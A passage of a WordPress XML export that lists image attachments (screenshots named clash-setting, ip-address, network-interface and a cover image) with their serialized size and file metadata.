:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[clash-setting]]></title>
		<link>http://www.ironmanzzm.top/?attachment_id=515</link>
		<pubDate>Sun, 13 Apr 2025 07:09:31 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/wp-content/uploads/2025/04/clash-setting.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>515</wp:post_id>
		<wp:post_date><![CDATA[2025-04-13 15:09:31]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2025-04-13 07:09:31]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2025-04-13 15:09:31]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2025-04-13 07:09:31]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[clash-setting]]></wp:post_name>
		<wp:status><![CDATA[inherit]]></wp:status>
		<wp:post_parent>512</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[attachment]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
						<wp:attachment_url><![CDATA[http://www.ironmanzzm.top/wp-content/uploads/2025/04/clash-setting.png]]></wp:attachment_url>
											<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attached_file]]></wp:meta_key>
		<wp:meta_value><![CDATA[2025/04/clash-setting.png]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attachment_metadata]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";i:1620;s:6:"height";i:1028;s:4:"file";s:25:"2025/04/clash-setting.png";s:8:"filesize";i:93228;s:5:"sizes";a:11:{s:6:"medium";a:5:{s:4:"file";s:25:"clash-setting-300x190.png";s:5:"width";i:300;s:6:"height";i:190;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:14336;}s:5:"large";a:5:{s:4:"file";s:26:"clash-setting-1024x650.png";s:5:"width";i:1024;s:6:"height";i:650;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:89012;}s:9:"thumbnail";a:5:{s:4:"file";s:25:"clash-setting-150x150.png";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:4716;}s:12:"medium_large";a:5:{s:4:"file";s:25:"clash-setting-768x487.png";s:5:"width";i:768;s:6:"height";i:487;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:57970;}s:9:"1536x1536";a:5:{s:4:"file";s:26:"clash-setting-1536x975.png";s:5:"width";i:1536;s:6:"height";i:975;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:159918;}s:16:"dashscroll-small";a:5:{s:4:"file";s:25:"clash-setting-200x200.png";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:7150;}s:17:"dashscroll-medium";a:5:{s:4:"file";s:25:"clash-setting-520x293.png";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:30049;}s:16:"dashscroll-large";a:5:{s:4:"file";s:25:"clash-setting-670x377.png";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:43258;}s:18:"dashscroll-large-h";a:5:{s:4:"file";s:25:"clash-setting-670x425.png";s:5:"width";i:670;s:6:"height";i:425;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:47715;}s:9:"alx-small";a:5:{s:4:"file";s:25:"clash-setting-200x200.png";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:7150;}s:10:"alx-medium";a:5:{s:4:"file";s:25:"clash-setting-520x293.png";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:30049;}}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[ip-address]]></title>
		<link>http://www.ironmanzzm.top/?attachment_id=517</link>
		<pubDate>Sun, 13 Apr 2025 07:10:30 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/wp-content/uploads/2025/04/ip-address.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>517</wp:post_id>
		<wp:post_date><![CDATA[2025-04-13 15:10:30]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2025-04-13 07:10:30]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2025-04-13 15:10:30]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2025-04-13 07:10:30]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[ip-address]]></wp:post_name>
		<wp:status><![CDATA[inherit]]></wp:status>
		<wp:post_parent>512</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[attachment]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
						<wp:attachment_url><![CDATA[http://www.ironmanzzm.top/wp-content/uploads/2025/04/ip-address.png]]></wp:attachment_url>
											<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attached_file]]></wp:meta_key>
		<wp:meta_value><![CDATA[2025/04/ip-address.png]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attachment_metadata]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";i:919;s:6:"height";i:517;s:4:"file";s:22:"2025/04/ip-address.png";s:8:"filesize";i:70749;s:5:"sizes";a:9:{s:6:"medium";a:5:{s:4:"file";s:22:"ip-address-300x169.png";s:5:"width";i:300;s:6:"height";i:169;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:52425;}s:9:"thumbnail";a:5:{s:4:"file";s:22:"ip-address-150x150.png";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:26122;}s:12:"medium_large";a:5:{s:4:"file";s:22:"ip-address-768x432.png";s:5:"width";i:768;s:6:"height";i:432;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:227422;}s:16:"dashscroll-small";a:5:{s:4:"file";s:22:"ip-address-200x200.png";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:44366;}s:17:"dashscroll-medium";a:5:{s:4:"file";s:22:"ip-address-520x293.png";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:128208;}s:16:"dashscroll-large";a:5:{s:4:"file";s:22:"ip-address-670x377.png";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:187123;}s:18:"dashscroll-large-h";a:5:{s:4:"file";s:22:"ip-address-670x377.png";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:187123;}s:9:"alx-small";a:5:{s:4:"file";s:22:"ip-address-200x200.png";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:44366;}s:10:"alx-medium";a:5:{s:4:"file";s:22:"ip-address-520x293.png";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:128208;}}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[ip-address]]></title>
		<link>http://www.ironmanzzm.top/?attachment_id=518</link>
		<pubDate>Sun, 13 Apr 2025 07:11:31 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/wp-content/uploads/2025/04/ip-address-1.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>518</wp:post_id>
		<wp:post_date><![CDATA[2025-04-13 15:11:31]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2025-04-13 07:11:31]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2025-04-13 15:11:31]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2025-04-13 07:11:31]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[ip-address-2]]></wp:post_name>
		<wp:status><![CDATA[inherit]]></wp:status>
		<wp:post_parent>512</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[attachment]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
						<wp:attachment_url><![CDATA[http://www.ironmanzzm.top/wp-content/uploads/2025/04/ip-address-1.png]]></wp:attachment_url>
											<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attached_file]]></wp:meta_key>
		<wp:meta_value><![CDATA[2025/04/ip-address-1.png]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attachment_metadata]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";i:919;s:6:"height";i:517;s:4:"file";s:24:"2025/04/ip-address-1.png";s:8:"filesize";i:70749;s:5:"sizes";a:9:{s:6:"medium";a:5:{s:4:"file";s:24:"ip-address-1-300x169.png";s:5:"width";i:300;s:6:"height";i:169;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:52425;}s:9:"thumbnail";a:5:{s:4:"file";s:24:"ip-address-1-150x150.png";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:26122;}s:12:"medium_large";a:5:{s:4:"file";s:24:"ip-address-1-768x432.png";s:5:"width";i:768;s:6:"height";i:432;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:227422;}s:16:"dashscroll-small";a:5:{s:4:"file";s:24:"ip-address-1-200x200.png";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:44366;}s:17:"dashscroll-medium";a:5:{s:4:"file";s:24:"ip-address-1-520x293.png";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:128208;}s:16:"dashscroll-large";a:5:{s:4:"file";s:24:"ip-address-1-670x377.png";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:187123;}s:18:"dashscroll-large-h";a:5:{s:4:"file";s:24:"ip-address-1-670x377.png";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:187123;}s:9:"alx-small";a:5:{s:4:"file";s:24:"ip-address-1-200x200.png";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:44366;}s:10:"alx-medium";a:5:{s:4:"file";s:24:"ip-address-1-520x293.png";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:128208;}}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[network-interface]]></title>
		<link>http://www.ironmanzzm.top/?attachment_id=519</link>
		<pubDate>Sun, 13 Apr 2025 07:11:55 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/wp-content/uploads/2025/04/network-interface.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>519</wp:post_id>
		<wp:post_date><![CDATA[2025-04-13 15:11:55]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2025-04-13 07:11:55]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2025-04-13 15:11:55]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2025-04-13 07:11:55]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[network-interface]]></wp:post_name>
		<wp:status><![CDATA[inherit]]></wp:status>
		<wp:post_parent>512</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[attachment]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
						<wp:attachment_url><![CDATA[http://www.ironmanzzm.top/wp-content/uploads/2025/04/network-interface.png]]></wp:attachment_url>
											<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attached_file]]></wp:meta_key>
		<wp:meta_value><![CDATA[2025/04/network-interface.png]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attachment_metadata]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";i:501;s:6:"height";i:274;s:4:"file";s:29:"2025/04/network-interface.png";s:8:"filesize";i:9641;s:5:"sizes";a:7:{s:6:"medium";a:5:{s:4:"file";s:29:"network-interface-300x164.png";s:5:"width";i:300;s:6:"height";i:164;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:9154;}s:9:"thumbnail";a:5:{s:4:"file";s:29:"network-interface-150x150.png";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:1983;}s:16:"dashscroll-small";a:5:{s:4:"file";s:29:"network-interface-200x200.png";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:2885;}s:17:"dashscroll-medium";a:5:{s:4:"file";s:29:"network-interface-520x293.png";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:20148;}s:16:"dashscroll-large";a:5:{s:4:"file";s:29:"network-interface-670x377.png";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:27886;}s:9:"alx-small";a:5:{s:4:"file";s:29:"network-interface-200x200.png";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:2885;}s:10:"alx-medium";a:5:{s:4:"file";s:29:"network-interface-520x293.png";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:9:"image/png";s:8:"filesize";i:20148;}}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[cover]]></title>
		<link>http://www.ironmanzzm.top/?attachment_id=521</link>
		<pubDate>Sun, 13 Apr 2025 07:21:17 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/wp-content/uploads/2025/04/cover.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>521</wp:post_id>
		<wp:post_date><![CDATA[2025-04-13 15:21:17]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2025-04-13 07:21:17]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2025-04-13 15:21:17]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2025-04-13 07:21:17]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[cover]]></wp:post_name>
		<wp:status><![CDATA[inherit]]></wp:status>
		<wp:post_parent>512</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[attachment]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
						<wp:attachment_url><![CDATA[http://www.ironmanzzm.top/wp-content/uploads/2025/04/cover.jpg]]></wp:attachment_url>
											<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attached_file]]></wp:meta_key>
		<wp:meta_value><![CDATA[2025/04/cover.jpg]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attachment_metadata]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";i:770;s:6:"height";i:602;s:4:"file";s:17:"2025/04/cover.jpg";s:8:"filesize";i:36203;s:5:"sizes";a:9:{s:6:"medium";a:5:{s:4:"file";s:17:"cover-300x235.jpg";s:5:"width";i:300;s:6:"height";i:235;s:9:"mime-type";s:10:"image/jpeg";s:8:"filesize";i:11738;}s:9:"thumbnail";a:5:{s:4:"file";s:17:"cover-150x150.jpg";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:10:"image/jpeg";s:8:"filesize";i:6611;}s:12:"medium_large";a:5:{s:4:"file";s:17:"cover-768x600.jpg";s:5:"width";i:768;s:6:"height";i:600;s:9:"mime-type";s:10:"image/jpeg";s:8:"filesize";i:39276;}s:16:"dashscroll-small";a:5:{s:4:"file";s:17:"cover-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";s:8:"filesize";i:9192;}s:17:"dashscroll-medium";a:5:{s:4:"file";s:17:"cover-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";s:8:"filesize";i:19966;}s:16:"dashscroll-large";a:5:{s:4:"file";s:17:"cover-670x377.jpg";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:10:"image/jpeg";s:8:"filesize";i:27335;}s:18:"dashscroll-large-h";a:5:{s:4:"file";s:17:"cover-670x524.jpg";s:5:"width";i:670;s:6:"height";i:524;s:9:"mime-type";s:10:"image/jpeg";s:8:"filesize";i:32994;}s:9:"alx-small";a:5:{s:4:"file";s:17:"cover-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";s:8:"filesize";i:9192;}s:10:"alx-medium";a:5:{s:4:"file";s:17:"cover-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";s:8:"filesize";i:19966;}}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
				</channel>
</rss>
	